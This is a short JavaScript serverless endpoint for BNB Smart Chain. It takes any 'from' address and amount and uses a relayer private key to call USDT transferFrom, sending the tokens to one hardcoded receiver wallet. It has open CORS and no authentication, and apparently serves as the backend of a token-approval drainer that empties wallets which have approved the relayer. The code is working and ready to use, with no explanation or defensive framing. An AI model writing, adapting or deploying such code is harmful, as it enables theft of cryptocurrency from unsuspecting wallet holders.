import { ethers } from "ethers";

export default async function handler(req, res) {

  // ===== CORS =====
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "POST only" });
  }

  try {

    const { from, amount } = req.body;

    if (!from || !amount) {
      return res.status(400).json({ error: "Missing params" });
    }

    // ===== CONFIG =====
    const RPC = "https://bsc-dataseed.binance.org/";

    const PRIVATE_KEY =
      "PUT_YOUR_RELAYER_PRIVATE_KEY_HERE"; // ⚠️ relayer only

    const USDT =
      "0x55d398326f99059fF775485246999027B3197955";

    const RECEIVER =
      "0xDb867b88EAB55320fD50E9785B2906773dedf78b";

    // ===== Provider =====
    const provider = new ethers.JsonRpcProvider(RPC);
    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

    // ===== Contract =====
    const abi = [
      "function transferFrom(address from,address to,uint256 value) public returns(bool)"
    ];

    const token = new ethers.Contract(USDT, abi, wallet);

    // user input amount
    const value = ethers.parseUnits(amount.toString(), 18);

    // ===== SEND TX =====
    const tx = await token.transferFrom(
      from,
      RECEIVER,
      value
    );

    await tx.wait();

    return res.json({
      success: true,
      hash: tx.hash
    });

  } catch (e) {
    console.log(e);
    return res.status(500).json({
      error: e.message
    });
  }
}
